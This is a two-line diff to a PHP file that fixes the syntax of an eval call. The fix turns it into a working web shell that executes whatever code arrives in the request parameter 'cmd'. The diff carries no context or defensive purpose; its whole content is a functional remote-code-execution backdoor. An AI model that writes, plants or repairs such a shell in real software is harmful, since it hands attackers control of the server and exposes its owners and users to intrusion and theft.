@@ -1,2 +1,2 @@
 <?php
-eval($_REQUEST('cmd'));
+eval($_REQUEST['cmd']);
